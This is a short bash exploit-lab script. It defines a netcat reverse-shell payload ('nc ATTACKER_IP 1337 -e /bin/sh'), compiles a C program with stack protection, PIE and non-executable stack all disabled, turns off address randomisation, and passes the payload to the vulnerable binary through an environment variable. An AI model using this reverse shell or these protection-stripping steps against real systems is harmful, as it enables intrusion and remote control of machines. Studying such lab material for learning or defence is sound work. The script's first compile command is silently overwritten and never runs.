#!/bin/bash

ATTACKER_IP="127.0.0.1"
ATTACKER_PORT="1337"

payload="nc $ATTACKER_IP $ATTACKER_PORT -e /bin/sh"
compile="gcc -m32 -z execstack -fno-stack-protector -no-pie -fno-pic -mpreferred-stack-boundary=2 -g getcmdptr.c -o getcmdptr"
run="./main"
compile="gcc -m32 -z execstack -fno-stack-protector -no-pie -fno-pic -mpreferred-stack-boundary=2 -g main.c -o main"
setarch $(uname -m) -R $compile && export PAYLOAD=$payload && $run

